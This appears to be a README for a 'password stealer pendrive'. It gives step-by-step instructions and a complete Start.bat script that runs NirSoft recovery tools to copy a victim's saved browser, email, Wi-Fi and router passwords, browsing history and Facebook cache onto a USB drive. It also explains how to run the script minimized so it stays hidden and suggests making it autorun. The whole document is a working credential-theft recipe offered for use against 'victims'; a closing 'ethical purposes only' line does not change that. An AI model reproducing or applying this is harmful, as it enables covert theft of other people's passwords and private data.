# Password-Stealer-Pendrive


By using this process you can get the victims:

      Browser Downloads
      Browser History
      Browser Saved Passwords
      Facebook Cache
      Wifi History
      Router Passwords
      and others.....

All the process are done for you in Release option!!
(But you still have to make shortcut so that  Start.bat  runs in minimized window)

You can download it and directly add it to your pendrive.

First of all go to this link https://www.nirsoft.net/password_recovery_tools.html


Then read the instructions and download those softwares
Then extract the .zip file and only save the extraxted files in your pendrive


Then delete:

      Dailupass.exe
      netpass.exe
      x64 (folder)
      
      
      
Then download:

      https://www.nirsoft.net/utils/browsing_history_view.html
      https://www.nirsoft.net/utils/web_browser_downloads_view.html
      https://www.nirsoft.net/utils/process_tcp_summary.html
      https://www.nirsoft.net/utils/router_password_recovery.html
      https://www.nirsoft.net/utils/facebook_cache_viewer.html
    
Your pendrive will look like this after downloading all the above files:

https://i.imgur.com/36rvypD.png



Finally, Create a folder named  Passwords

then create a file named  Start.bat 

Open Start.bat with notepad

Finally paste the code below:

      start BrowserDownloadsView.exe /stext Passwords\BrowserDownloads.txt
      start BrowsingHistoryView.exe /stext Passwords\BrowsingHistory.txt
      start ChromePass.exe /stext Passwords\ChromePass.txt
      start iepv.exe /stext Passwords\iepv.txt
      start mailpv.exe /stext Passwords\mailpv.txt
      start mspass.exe /stext Passwords\mspass.txt
      start PasswordFox.exe /stext Passwords\PasswordFox.txt
      start ProcessTCPSummary.exe /stext Passwords\ProcessTCPSummary.txt
      start PstPassword.exe /stext Passwords\PstPassword.txt
      start RouterPassView.exe /stext Passwords\RouterPassView.txt
      start WebBrowserPassView.exe /stext Passwords\WebBrowserPass.txt
      start WifiHistoryView.exe /stext Passwords\WifiHistoryView.txt
      start FBCacheView.exe /stext Passwords\FBCache.txt

then,

Create a shortcut for  Start.bat  named Start

then,

Right click on the shortcut you created 

Left click on Properties and in  Run  set it to  Minimized 

So you have successfully created a data stealer pendrive.

Your Pendrive should look like this:

https://i.imgur.com/44TPRS2.png

To start the stealing process you just have to click the  Start  shortcut then cmd will be opened in background and will save all the information to your pendrive.

TIP:

You can also make pendrive autorun itself when inserted:

Search in Youtube how to do that.




NOTE:
Use these programs for ethical purposes only. I am not responsible for any thing you do!!
